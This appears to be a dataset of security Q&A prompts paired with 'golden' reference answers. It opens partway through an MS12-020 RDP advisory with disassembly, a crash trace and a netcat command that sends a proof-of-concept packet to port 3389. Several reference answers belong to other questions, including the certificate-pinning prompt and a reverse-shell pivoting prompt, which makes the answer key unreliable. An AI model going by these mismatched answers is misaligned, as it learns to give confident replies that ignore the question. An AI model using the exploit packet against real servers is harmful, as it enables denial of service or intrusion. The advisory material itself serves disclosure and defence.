ff750c          push    dword ptr [ebp+0Ch]\n  f76188af 57              push    edi\n  f76188b0 e8b9fcffff      call    termdd!IcaBufferAllocInternal (f761856e)\n  f76188b5 5f              pop     edi\n  f76188b6 5e              pop     esi\n  f76188b7 5d              pop     ebp\n  f76188b8 c21800          ret     18h\n  f76188bb 33c0            xor     eax,eax\n  f76188bd 53              push    ebx\n  f76188be 8d7e10          lea     edi,[esi+10h]\n  f76188c1 40              inc     eax\n  f76188c2 f00fc107        lock xadd dword ptr [edi],eax\n  f76188c6 ff751c          push    dword ptr [ebp+1Ch]\n  f76188c9 8b4618          mov     eax,dword ptr [esi+18h]                  ; the same value of before\n  f76188cc ff7518          push    dword ptr [ebp+18h]\n  f76188cf ff7514          push    dword ptr [ebp+14h]\n  f76188d2 ff7510          push    dword ptr [ebp+10h]\n  f76188d5 ff750c          push    dword ptr [ebp+0Ch]\n  f76188d8 ff761c          push    dword ptr [esi+1Ch]\n  f76188db ff10            call    dword ptr [eax]                          ; code execution\n  f76188dd 8bd8            mov     ebx,eax\n  f76188df 83c8ff          or      eax,0FFFFFFFFh\n  f76188e2 f00fc107        lock xadd dword ptr [edi],eax\n  f76188e6 7506            jne     termdd!IcaBufferAlloc+0x72 (f76188ee)\n  f76188e8 56              push    esi\n  f76188e9 e8382f0000      call    termdd!_IcaUnloadSd (f761b826)\n  f76188ee 8bc3            mov     eax,ebx\n  f76188f0 5b              pop     ebx\n  f76188f1 ebc2            jmp     termdd!IcaBufferAlloc+0x39 (f76188b5)\n\n  eax=040b0402 ebx=e1492090 ecx=00390080 edx=00000003 esi=040b0402 edi=e1438240\n  eip=f762888c esp=b832f9d8 ebp=b832f9e0 iopl=0         nv up ei pl nz na po nc\n  cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202\n  termdd!IcaBufferAlloc+0x10:\n  f762888c 8b4618          mov     eax,dword ptr [esi+18h] ds:0023:040b041a=????????\n\n  ChildEBP RetAddr  \n  b8b399e0 b89c1c34 termdd!IcaBufferAlloc+0x10\n  b8b39a00 b89c1c67 RDPWD!StackBufferAlloc+0x26\n  b8b39a2c b89a902c RDPWD!MCSDetachUserRequest+0x29\n  b8b39a40 b89a8b44 RDPWD!NMDetachUserReq+0x14\n  b8b39a4c b89a9185 RDPWD!NM_Disconnect+0x16\n  b8b39a58 b89adcb4 RDPWD!SM_Disconnect+0x27\n  b8b39a68 b89a906d RDPWD!SM_OnConnected+0x70\n  b8b39a88 b89a8db4 RDPWD!NMAbortConnect+0x23\n  b8b39ac0 b89a9d88 RDPWD!NM_Connect+0x86\n  b8b39ae0 b89abcfc RDPWD!SM_Connect+0x112\n  b8b39b08 b89ac786 RDPWD!WDWConnect+0x368\n  b8b39b3c b89a6959 RDPWD!WDWConfConnect+0x94\n  b8b39b70 f762c1c7 RDPWD!WD_Ioctl+0x1227\n  b8b39b8c f762c5a3 termdd!_IcaCallSd+0x35\n  b8b39bac f762ca10 termdd!_IcaCallStack+0x55\n  b8b39bf4 f762abcc termdd!IcaDeviceControlStack+0x414\n  b8b39c24 f762ad20 termdd!IcaDeviceControl+0x4e\n  b8b39c3c 8081d5c3 termdd!IcaDispatch+0x12a\n  b8b39c50 808ed4eb nt!IofCallDriver+0x45\n  b8b39c64 808ee28d nt!NtWriteFile+0x2943\n  b8b39d00 808e6dbc nt!NtWriteFile+0x36e5\n  b8b39d34 80883968 nt!NtDeviceIoControlFile+0x2a\n  b8b39d64 7c82847c nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+0xb14\n  b8b39d68 badb0d00 ntdll!_NLG_Notify+0x14\n\nOn Windows 2003 that zone of the memory pointed by ESI+18 using the\nprovided proof-of-concept is ever in the range 040b02??-040b04??.\nThe exploitability depends by the possibility of controlling ESI or the\ncontent pointed by it (maybe via a form of heap spraying?), indeed in\nmy quick tests this zone sometimes is allocated and others it isn't.\n\nNote that on the post-Vista Windows versions (like 7 and 2008) \"seems\"\nnecessary to have \"Allow connections from computers running any version\nof Remote Desktop\" for being vulnerable.\nAnyway I'm not totally sure about this so-called limitation because it\nlooks like dependent by my proof-of-concept only.\n\nThe provided proof-of-concept uses the BER integer values set at 32bit\n(big endian) in case they could be useful for easier debugging.\n\nAdditional details about the protocol:\nhttp://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx\n\n\n#######################################################################\n\n===========\n3) The Code\n===========\n\n\nhttp://aluigi.org/poc/termdd_1.dat\nhttps://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/18606.dat\n\n  nc SERVER 3389 &lt; termdd_1.dat\n\nresend it multiple times in case of no results and note that this is\njust a simple proof-of-concept packet to quickly test the bug so it's\nnot optimized at all.\n\n\n#######################################################################\n\n======\n4) Fix\n======\n\n\nhttp://technet.microsoft.com/en-us/security/bulletin/ms12-020\n\n\n#######################################################################\n</code></pre>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I generated a public/secret key pair with GnuPG. I know that the secret key must keep secret. However, I am wondering what are the risk to expose the secret key without the passphrase?</p>\n\n<p>If Eve steals my laptop and can access to all my data, what are her abilities to use my secret key without knowing my passphrase?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The passphrase is the 'key' to use to your 'secret key'. You should keep your secret key file safe, but in case Eve stole your laptop, or your file, if there is no passphrase, she can use your secret key to decipher your secrets.\nIf you copy your secret key file to a different computer, to use that file you will need your passphrase.</p>\n\n<p>Lets say is and extra safeguard to make sure you are the one that should be using that secret key.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Suppose my computer is compromised or has malware.  Can the malware spread to my phone?  If so, how?  Has any malware been observed in the wild to do this?</p>\n\n<p>Relevance: Some banks use two-factor authentication of online banking transactions; when you want to make a transaction, they send a confirmation code to your phone, and then you need to enter it into the web site to confirm.  This is intended to protect against fraud by malware on the customer's computer, but if malware can spread from your computer to your phone, this protection looks less effective.  Also, a number of web sites have started to use two-factor authentication, and they would be affected similarly.</p>\n\n<p>Related: <a href=\"https://security.stackexchange.com/q/11447/971\">Can a compromised mobile phone be used to penetrate a desktop or server?</a> asks about the reverse scenario.</p>\n\n\nAssistant:",
        "golden_answer": " <p>There is no reason why malware cannot spread from any kind of device to any kind of device, it all depends on how the malware has been developed. AFAIK there is no malware known that infects both PCs and mobiles at this point, but there's no reason it can't be done. Possible vectors are:</p>\n\n<ol>\n<li>infected music files: a malware infected music file could be spread to a mobile during some sort of sync, like an itunes sync</li>\n<li>Over the network: mobiles are often connected to wireless networks, malware could be designed to use vulnerabilities in mobile OSs to infect them</li>\n<li>Over a USB connection: when you connect your mobile to your computer communication is possible between the 2 devices, and communications path is a possible malware infection vector</li>\n<li>Bluetooth</li>\n</ol>\n\n<p>Of course there are other ways a mobile could be infected (phishing, infected emails, etc), but they are not a direct spread from a computer to a mobile. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've been reading various articles about escaping restricted shells, e.g. rbash. I’ve been speaking with friends working in different Linux environments (small, mid-size and huge) and none of them is using restricted shells. </p>\n\n<p>Are restricted shells really used that often or is it more for demonstrative purposes described in various writings? </p>\n\n\nAssistant:",
        "golden_answer": " <p>No. In my experience, they are (almost) never used. </p>\n\n<p>There used to be an idea that, if you could restrict the shell, you could limit the user's access to the system. However, for a determined user, the restricted shell does not pose a real hindrance. </p>\n\n<p>It could be (and was in the past) used to limit users that have little computer knowledge, to prevent them from doing inadvertently something horribly wrong. However, nowadays, these kind of people do not log in to a shell, but most of the time, they will use a web interface.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I can't seem to make my interface go on monitor mode, here is my terminal\n<a href=\"https://gyazo.com/c2a84f7585ea89e59e56bbe1ed585fc5\" rel=\"nofollow\">https://gyazo.com/c2a84f7585ea89e59e56bbe1ed585fc5</a></p>\n\n<p><a href=\"https://gyazo.com/2ba669ca7f62787b126e2e107beefb24\" rel=\"nofollow\">https://gyazo.com/2ba669ca7f62787b126e2e107beefb24</a></p>\n\n\nAssistant:",
        "golden_answer": " <p>Although that kill processes command <code>airmon-ng check kill</code> may solve the problem, <strong>don't use it</strong> because you'll <strong>stop many functionalities</strong> including the network-manager application.</p>\n\n<p>Instead, use the following commands when starting monitor mode:</p>\n\n<pre><code>#&gt; airmon-ng start wlan0\n#&gt; ifconfig wlan0mon down\n#&gt; iwconfig wlan0mon mode monitor\n#&gt; ifconfig wlan0mon up\n</code></pre>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Has there been any cases where hackers have taken over the phone number to a business, by creating a phone number in the same area code, setting up a virtual PBX / Asterisk system, routing all calls to the business, recording the conversations, and updating/hijacking Google/Bing/Yelp listings for the business with their own phone number?</p>\n\n<p>I've run into at least two businesses who I've confirmed their number, and both have said \"That's not our number.\", yet I was able to reach them. One was an insurance agency and another was a process server. I'm guessing someone may be able to record the conversation and extract credit card numbers or CCV numbers. Not every small business is up-to-date with their online listing.</p>\n\n\nAssistant:",
        "golden_answer": " <p>This sounds like what you were looking for:</p>\n\n<p><a href=\"http://www.theregister.co.uk/2009/02/11/fugitive_voip_hacker_arrested/\" rel=\"nofollow\">http://www.theregister.co.uk/2009/02/11/fugitive_voip_hacker_arrested/</a></p>\n\n<p>The work the Kevin Mitnick did was on older Plain old telephone system which was analog based. However, open source projects like Asterisk use protocols like VOIP, which is not analog but rather digital communication.  </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>There are websites which claim to do \"DNS leak tests\". I don't care so much about DNS leaks but am curious, how does the website know which DNS server I am using? I guessed it would be a header sent in the HTTP request but wasn't able to find it.</p>\n\n<p>Example website: <a href=\"https://www.dnsleaktest.com/\">https://www.dnsleaktest.com/</a></p>\n\n<p>EDIT: there are plenty of other <a href=\"https://www.perfect-privacy.com/dns-leaktest/\">examples</a> found through a google search. </p>\n\n\nAssistant:",
        "golden_answer": " <p><strong>This is a DNS resolution trick that could also be performed using non-http protocols but in this case is performed by using random hostnames and zero-pixel images via http.</strong></p>\n\n<p>Look at the source code on the page and you will see a series of random 10-character subdomains requested for several URL's. These are very unique hostnames which neither your computer or your ISP, or more importantly your DNS provider, will have cached in local DNS. </p>\n\n<p>When these unique URL's hostnames hit your DNS provider they then have to request them from the testing companies website who then correlates the owners IP address doing the unique DNS request and then notifies you of the company name that made the request via a quick lookup  </p>\n\n<p>List of randomized host names all for the same domain</p>\n\n<pre><code>ixc9a5snm4.dnsleaktest.com\nrhl50vm36o.dnsleaktest.com\n4xov3y3uvc.dnsleaktest.com\n2n5t99gbzp.dnsleaktest.com\n6mzklkved4.dnsleaktest.com\nd6z20e9c2x.dnsleaktest.com\n</code></pre>\n\n<p>can be found in the following html (your hostnames will be different)</p>\n\n<pre><code>&lt;img width=0 height=0 src=\"https://ixc9a5snm4.dnsleaktest.com\"&gt;.\n&lt;img width=0 height=0 src=\"https://rhl50vm36o.dnsleaktest.com\"&gt;.\n&lt;img width=0 height=0 src=\"https://4xov3y3uvc.dnsleaktest.com\"&gt;.\n&lt;img width=0 height=0 src=\"https://2n5t99gbzp.dnsleaktest.com\"&gt;.\n&lt;img width=0 height=0 src=\"https://6mzklkved4.dnsleaktest.com\"&gt;.\n&lt;img width=0 height=0 src=\"https://d6z20e9c2x.dnsleaktest.com\"&gt;.\n</code></pre>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Im a beginner in WASA.\nI just wanted to know if \"certificate pinning\" can avoid request/response from getting captured by proxies like burp/fiddler?\nIf not so, then if I want my request and response not to be captured by proxies then what should I do?</p>\n\n<p>Thanks in advance.</p>\n\n\nAssistant:",
        "golden_answer": " <p>As the connection is transient, using netstat or similar wont be an option.</p>\n\n<p>If you know at least the name of the executable and/or the destination IP address it connects to, you can run WireShark to capture the traffic.</p>\n\n<p>Although WireShark is confusing to begin with, all you need is the port details which won't be too hard to get.</p>\n\n<p>You need to install WireShark (it will likely want you to install another small app, pcap, that allows it to talk in a special way to the network card). Run it and configure it to only capture data for the single executable and the destination IP address if you know it. Otherwise you will get too much confusing detail to make anything out.</p>\n\n<p>Job done.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I somehow noticed that there were numerous reports of security vulnerabilities of vsftpd 2.0.1~2.0.5; however, there just seems to be no public exploits.</p>\n\n<p>The server I am working on has vsftpd 2.0.5 (set up by my supervisor-head administrator), and I am just worried that someone might be able to attack the server...</p>\n\n<p>If there is any known exploit, can anyone provide me with the known links to public exploits? (so that I may make some vulnerability assessment.)</p>\n\n\nAssistant:",
        "golden_answer": " <p><a href=\"http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=vsftpd&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=\" rel=\"noreferrer\">Exploit-db</a> finds 3 exploits (click link). 1 for that specific version and 2 for higher versions. </p>\n\n<p><a href=\"http://www.osvdb.org/search?search%5Bvuln_title%5D=vsftpd&amp;search%5Btext_type%5D=titles\" rel=\"noreferrer\">OSVDB</a> shows 11 exploits however you have to click each ID to see which version the exploits are for.</p>\n\n<p><a href=\"http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=vsftpd\" rel=\"noreferrer\">cve.mitre.org</a> also reports 11 exploits. Versions are listed in the description. There are some there specific for 2.0.5.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have several google/gmail accounts for various purposes.   This morning I woke up to the following message from google saying the recovery email address had changed.   Here is the email</p>\n\n<blockquote>\n<pre><code>Your recovery email address changed   \nHi VNS娱乐城876502.com注册送88元,网上最火爆的游戏平台,超好赢钱游戏,\nThe recovery email for your Google Account g*****737@gmail.com was recently changed.\n\nDon't recognize this activity?\nReview your recently used devices now.\nBest,\nThe Google Accounts team\nThis email can't receive replies. For more information, visit the Google Accounts Help Center.\n</code></pre>\n</blockquote>\n\n<p>The thing is, neither VNS娱乐城876502.com注册送88元,网上最火爆的游戏平台,超好赢钱游戏 nor g*****737@gmail.com are email addresses that I have ever used before.   Why would I receive a notice about an email recovery account I do not own having the backup email changed?   </p>\n\n<p>Here is a screenshot<a href=\"https://i.stack.imgur.com/fndGF.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/fndGF.png\" alt=\"enter image description here\"></a></p>\n\n<p>From all appearances it looks like the email is actually from google.   </p>\n\n<p>Then at 12:01 AM last night I get the following email telling me someone is trying to login to an actual email account I do own.   Luckily I use randomized passwords plus MFA for everything that allows 2 factor auth.  Any time someone tries to login to any of my google accounts from any computer that I have never logged into before will kick off the MFA request.</p>\n\n<blockquote>\n  <p>Review blocked sign-in attempt     You received this message because\n  r*****6@gmail.com is listed as the recovery email for\n  e*****e@gmail.com. If e*****e@gmail.com is\n  not your Google Account, click here to disconnect from that account\n  and stop receiving emails.     Hi John, Google just blocked someone from\n  signing into your Google Account e*****e@gmail.com from\n  an app that may put your account at risk. Less secure app Sunday,\n  October 23, 2016 12:01 AM (Pacific Daylight Time) California, USA*\n  Don't recognize this activity? If you didn't recently receive an error\n  while trying to access a Google service, like Gmail, from a non-Google\n  application, someone may have your password.</p>\n  \n  <p>SECURE YOUR ACCOUNT</p>\n  \n  <p>Are you the one who tried signing in? Google will continue to block\n  sign-in attempts from the app you're using because it has known\n  security problems or is out of date. You can continue to use this app\n  by allowing access to less secure apps, but this may leave your\n  account vulnerable.</p>\n  \n  <p>Best, The Google Accounts team</p>\n</blockquote>\n\n<p>I have already went ahead and changed my password for the account in question, but I was wondering if there was any further action I should take to secure my gmail account past what I am already doing?</p>\n\n\nAssistant:",
        "golden_answer": " <p>This is a suspicious email. I would suggest you check and analyze header of the email you recieved and verify if its sent from google. Also check IP of the sender.\nCheck this link for more info;  <a href=\"http://www.howtogeek.com/108205/htg-explains-what-can-you-find-in-an-email-header/\" rel=\"nofollow\">http://www.howtogeek.com/108205/htg-explains-what-can-you-find-in-an-email-header/</a> </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have no cyber security knowledge whatsoever, and am trying to safely store passwords in a database. I understood I need to use salt, to avoid rainbow table attacks and to make sure two users with the same password will have different password hashes.</p>\n<p>However, does the complexity of the salt matter? I was planning on simply using the user's id (an integer that's incremented each time a new account is created), but is it good enough, or should I generate a more complex salt?</p>\n\n\nAssistant:",
        "golden_answer": " <h1>The important part</h1>\n<p>The fact that you are generating salts on your own is a red flag. The best way to do this, especially if you have little experience with security, is to use an established library for password hashing.</p>\n<p>A well-designed library will generate and use salts automatically for you, and it will store the salt and the hash in the same string, that you put in one column in your database.</p>\n<p>So, use a slow algorithm designed for password hashing, and use an established library, and you won't have to think about how to generate the salt.</p>\n<h1>The answer</h1>\n<p>Still, I should answer your question. Does it matter if the salt has high entropy? There are two properties that we may want the salt to have here, that randomness helps with:</p>\n<ul>\n<li>Unique, in your database, between password changes and preferably globally, so that an attacker can only crack one password at a time.</li>\n<li>Unknown to the attacker (before a breach), so that an attacker targeting a specific account can not start any preparatory work before the database is leaked.</li>\n</ul>\n<p>Using a counter as salt is a decent solution, but not perfect. The salt is at least locally unique, but it's not globally unique or even unique over multiple installations of the same software. It's not unknown to the attacker, but that really isn't such a big issue. Once the hash is leaked, the salt will be leaked too.</p>\n<p>But still, using a library that gives you a random salt will be better. Don't mess around with homebrew solutions for something as important as this!</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Are there any utilities out there that can assist in building an IP exclusion list?</p>\n\n<p>Scenario: Recently suffered a brute force attack where 50000 failed login attempts came from a multitude of different IP addresses.</p>\n\n<p>Question: Is there a utility out there that can take a list of IP addresses and help build an IP exclusion list. IE... Take commonalities from the IP list, and build an IP range to block?</p>\n\n<p>Disclaimer: Security is not my background. I come from a programming background, and have worked with computers for 20+ years, but never with a primary focus on security. So I apologize in advanced if my question is not up to snuff with security professionals out there.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You have a unique requirement. But your basis may be off.</p>\n\n<p>I'll use an incident I ran into this week as an example. I discovered an attack from 50 IP addresses from a block of IPs managed by a hosting company in Hong Kong. It would make sense, then, to block all IPs from this hosting company, at least temporarily. I believe this is similar to the scenario that you have in mind. </p>\n\n<p>To accomplish this, you would have to run a <code>whois</code> on the IPs, link them to a common holder, and populate your list with the block of IPs. Programatically, this is trivial if the use case is as I defined.</p>\n\n<p>But what if the owner of the IP block is AWS? Do you block all of AWS? For some sites, this might be a valid thing to do. Then what if the attacker detects the block (it's a common feature in botnets) and they switch to another hosting site; do you add this new block to the list? Project this process into the future where now you are blocking all major hosting providers and even a few ISPs (if the botnets switched to personal computers and your script added Comcast IP blocks). You have now DoS'ed your own service. </p>\n\n<p><strong>The problem, then, is not the process of adding IP blocks, but the problem is not adding too much.</strong> </p>\n\n<p>The typical way security pros address this problem is to block each IP individually. Fail2ban is a common utility to do this. </p>\n\n<p>Or, if you know that certain countries are not normally using your service, then you can use geo-IP databases and only allow (or block) certain countries. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The HSTS standard states the following:</p>\n<blockquote>\n<p><strong>12.1.  No User Recourse</strong></p>\n<p>Failing secure connection establishment on any warnings or errors\n(per Section 8.4 (&quot;Errors in Secure Transport Establishment&quot;)) should\nbe done with &quot;no user recourse&quot;.  This means that the user should not\nbe presented with a dialog giving her the option to proceed.  Rather,\nit should be treated similarly to a server error where there is\nnothing further the user can do with respect to interacting with the\ntarget web application, other than wait and retry.</p>\n</blockquote>\n<p><a href=\"https://www.rfc-editor.org/rfc/rfc6797#section-12.1\" rel=\"nofollow noreferrer\">https://www.rfc-editor.org/rfc/rfc6797#section-12.1</a></p>\n<p>I can see why for non-HSTS hosts (such as networking devices) it would be beneficial to have a way to bypass the warning quickly, for setting up and deploying a valid certificate, as these devices may come out of the box with an invalid certificate.</p>\n<p>Given that the HSTS standard says that there should be no user recourse, and that there is already a <code>--ignore-certificate-errors</code> flag which achieves the same aim, what is the justification for giving users an easier way to get around HSTS issues, rather than limiting the bypass to non-HSTS hosts?</p>\n\n\nAssistant:",
        "golden_answer": " <p>It's probably within the spec. The phrase is <a href=\"https://chromium.googlesource.com/chromium/src/+/d8fc089b62cd4f8d907acff6fb3f5ff58f168697\" rel=\"noreferrer\">regularly changed</a>, and it's not something you happen upon by chance. You have to know what you're looking for (e.g. google 'chrome hsts bypass'), which indicates that you're aware of the risk.</p>\n\n<p>The bar for using this is a <em>lot</em> higher than clicking 'Proceed', as it is not documented in the Error Message shown to the user. </p>\n\n<p>In addition, there's really no certifying authority when it comes to RFCs. Parts of them are open to interpretation, and there is no official body that will tell you if you comply with a RFC or not.</p>\n\n<p>Having a way to bypass it for users that <strong>do</strong> understand the implications is in my opinion wise, as it makes it easier to dissect if your own site is under attack - or if you are simply investigating for instance a phishing attack against your organization. </p>\n\n<p>In short - it's an balancing act between being <strong>impossible</strong> and <strong>really obscure</strong>. I think the <code>thisisunsafe</code> is an reasonable balance. Unlikely to be used by unknowledgeable users, yet available when needed.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I would like to know whether a firewall can scan an HTTPS packet, to verify its source, destination, and data. </p>\n\n<p>Or how to stop a user from sending the file over HTTPS if it contains some unwanted data.</p>\n\n\nAssistant:",
        "golden_answer": " <p>There are two aspects to prevent data loss of the type you are concerned about.</p>\n\n<ul>\n<li><p>Deep Packet Inspection</p>\n\n<p>For HTTPS which is, of course, encrypted between the source and destination, you need a security service that has, as Mark said, a certificate trusted by your users browsers. It acts as a Man-in-The-Middle and so is able to continue to inspect all of the packets going through, even those that would normally be encrypted. </p>\n\n<p>Any decent system will do this dynamically based on a risk score and will white-list destinations such as personal finance sites so that you can continue to offer users a degree of privacy while ensuring organisational and unknown  traffic is monitored.</p></li>\n<li><p><a href=\"https://en.wikipedia.org/wiki/Data_loss_prevention_software\" rel=\"nofollow\">Data Loss Prevention</a></p>\n\n<p>DLP uses rules to identify information that you might consider sensitive. Nationl Insurance numbers, credit card numbers, drivers license ids, etc.</p>\n\n<p>Using a risk scoring system, the DLP will watch for sensitive information leaving (and entering if required) the organisational boundaries and provide alerts when rules are exceeded.</p>\n\n<p>Clearly DLP also requires the ability to intercept encrypted communications but you will probably implement DLP in more places. Certainly in the security boundary but also on organisational computers, especially laptops and desktops. Maybe mobiles too.</p>\n\n<p>DLP is particularly critical in regulated industries such as health and finance.</p></li>\n</ul>\n\n<p>One thing that I personally believe critical if you plan to implement things like this is to <strong>inform all users</strong> that their traffic is being monitored. You should make sure that information is baked into any Acceptable Use Policies and Information Governance policies. You should also include it in your Terms and Conditions of Use.</p>\n\n<p>If you don't do that, you open yourself to accusations of intercepting private communications. Note that organisational communications generally get special exemptions from some privacy rules since there is an expectation that corporate communications contain corporate information.</p>\n\n<p>UPDATE: Lest you think this is the realm of the paranoid as @Somone Somewhere seems to, let me assure you that it isn't.</p>\n\n<p>While data can be exfiltrated in a number of ways that would bypass centralised security infrastructure, it would still catch the majority of risks:</p>\n\n<ol>\n<li><em>Users deliberately sending sensitive data somewhere they shouldn't</em>. This might be for nefarious reasons though more commonly it is to send it to a less protected, non-corporate system (e.g. a home PC) to do something they are not allowed to do at work. While this may seem convenient to them, they may well be breaking the law and they are in danger of leaking the sensitive information (think about patient information, contracts, etc)</li>\n<li><em>Malware</em>. There are plenty of types of malware that attempt to exfiltrate sensitive information. Some targetted at specific industries (health records are particularly valuable) and others at general information such as banking and other finance details. Malware authors are not stupid, most malware comms is encrypted. Patterns of traffic other than genuine HTTPS can often be detected and if HTTPS traffic is identified and cannot be decrypted, that too indicates malware.</li>\n</ol>\n\n<p>Just because a security infrastructure is not 100% effective doesn't mean that it is ineffective.</p>\n\n<p>At the end of the day, your organisation needs to weigh up the risks and costs and decide what level of security is needed. Risks will take into account the value of the data you hold, any legal constraints and how much of a target you are.</p>\n\n<p>When considering the legal constraints, don't forget to take into account that corporate executives may be held <em>personally</em> responsible for sensitive data leaks.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Mathematically, is there a difference which set of characters is private_key and which one is public_key?</p>\n\n<p>@Edit\nAt the moment of asking I was thinking on RSA, not asymmetric crypto in general. </p>\n\n\nAssistant:",
        "golden_answer": " <p><strong>Shouldn't necessarily matter...</strong><br>\nIn RSA you can use either d (private) or e (public) to encrypt and also decrypt. This doesn't work with all cryptosystems. For example DSA won't allow this.</p>\n\n<p>So technically it wouldn't really matter if you exchanged the values of e and d.</p>\n\n<p><strong>...but does</strong><br>\n<strong>Performance:</strong><br>\nBut actually you usually want verification (using e) to be fast. And then accept that signing (using d) is slower.</p>\n\n<p>Usually the public exponent is picked to be some simple and small binary representation. The number <a href=\"https://en.wikipedia.org/wiki/65537_(number)\" rel=\"nofollow noreferrer\">65537</a> (0b10000000000000001) is regularly picked as the public exponent. And a much, much larger (about the same size as the modulus, so about 2048 bits nowadays) number as the private key.</p>\n\n<p>See also: <a href=\"https://crypto.stackexchange.com/questions/3110/impacts-of-not-using-rsa-exponent-of-65537\">https://crypto.stackexchange.com/questions/3110/impacts-of-not-using-rsa-exponent-of-65537</a></p>\n\n<p><strong>Security:</strong><br>\nAnd: You can't really flip this around (large public exponent, small private exponent), because there are published attacks on small private exponents. (<a href=\"https://en.wikipedia.org/wiki/Wiener&#39;s_attack\" rel=\"nofollow noreferrer\">Wiki: Wiener's attack</a>)</p>\n\n<p>See also: <a href=\"https://crypto.stackexchange.com/questions/3271/why-should-the-rsa-private-exponent-have-the-same-size-as-the-modulus\">https://crypto.stackexchange.com/questions/3271/why-should-the-rsa-private-exponent-have-the-same-size-as-the-modulus</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>We all can read news about \"Hardware trojans\" (it has grown in the recent few years..). </p>\n\n<p><strong>But my question is:</strong> Besides the network card, could there be any HW trojan that can cause any real damage? </p>\n\n<p>If I would need to put a HW trojan in a server/computer, then I would put it in the NIC, since I can only reach the machine over ethernet/wifi. It does not make sense to me to put a HW trojan in a CPU. (I just don't understand why are people so afraid of HW trojans. Shouldn't they only need to be worried about their NIC card? )</p>\n\n\nAssistant:",
        "golden_answer": " <p>Since a perfectly honest network card acts under the control of the host CPU, a malicious hardware element in the CPU can perfectly betray the user's secrets. After all, when you have some malware in your machine, the malware is just software, and it runs on the CPU -- and yet your secret data can escape.</p>\n\n<p>Any piece of hardware with <a href=\"http://en.wikipedia.org/wiki/Direct_memory_access\" rel=\"nofollow\">DMA</a> access can read and write memory at will, and thus can modify OS and application code as it gets executed. This is sufficient to do everything that kernel-level malware can do, i.e. quite a lot of evilness. This includes the CPU itself, the GPU, the hard disk controllers, the network cards, the USB controllers...</p>\n\n<p>Even if you are intent on having a <em>dormant</em> backdoor, which does nothing until activated from the outside, it can still be done purely in the CPU, or in the DMA controller: it suffices to have the CPU or the DMA controller inspect memory transfers and wait for a specific pattern, which triggers the hostile code. Attacker then just has to send a ping request or some other packet with the said pattern: the DMA controller will see it when it transfers it from the NIC to the main RAM, and the CPU will see it when it recomputes the IP packet checksum.</p>\n\n<hr />\n\n<p>People are afraid of hardware backdoors because they feel they have no control over it -- and that's entirely true.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I was able to get a php reverse shell on a webserver, say X that is behind all sorts of perimeter security stuff. </p>\n\n<p>Now I want to target a machine on the same LAN with X, how do I setup metasploit for that and set LHOST etc?</p>\n\n\nAssistant:",
        "golden_answer": " <p>There are several popular approaches to this. </p>\n\n<p>First, is getting an independent, 3rd party auditor to vouch for you. This is most effective if it is done by a well-known name (e.g. get Troy Hunt to vouch for you, or Charlie Miller if you're on Apple's OS), or a huge household name (if your target market are non-technical / non-security folk) - e.g. E&amp;Y, or Accenture.   </p>\n\n<p>Taking this a step further, you can get accredited by a 3rd-party regulation or certification. This is possibly the most popular, and IMO likely the least effective.<br>\nThis could range from PCI-DSS (which you would have to do anyway if you handle credit cards), through to the infamous \"HackerSafe\" (I think its called \"McAfeeSECURE!!1!\" now). Either way, it doesn't <em>actually</em> show any real quality, and in some cases is easily spoofed. <em>cough cough</em></p>\n\n<hr>\n\n<p>There is a third option, which is much more difficult to do right, but a lot more effective particularly with those that most understand what this means. This option requires two steps:   </p>\n\n<ol>\n<li>Actually being secure, and having a strong process to ensure this; </li>\n<li>Sharing details of that process, and what it actually entails.  </li>\n</ol>\n\n<p>Being secure is a much wider question and out of scope of this answer; sharing the details is obviously much less common in big corporates, though I am starting to see this in more startups and even larger, but technical, enterprises.  </p>\n\n<p>This could include information about your SDLC; explanations of your security requirements; technical details about your implementation; possibly an open bug bounty, but at least a statement of response to researchers (<em>and follow through!</em>); maybe even opensourcing your codebase, if relevant; and so on and so on.   </p>\n\n<p>Obviously you would need an experienced security expert to help you get your application to be secure; a very good one could help you \"open the kimono\" in a productive, yet secure, manner. Done right, this could even increase marketing efforts, and still not reveal any sensitive details that could help an attacker bypass your controls. </p>\n\n<p>Interestingly often old-school security pros (especially those with a corporate background) will insist on not revealing anything; but not only should this not at all increase your risk or attack surface (if done right), it can definitely help allay any potential customer fears or worries, especially if they understand what they're reading.<br>\nJust make sure you have someone who knows what they're doing. </p>\n"
    },
    {
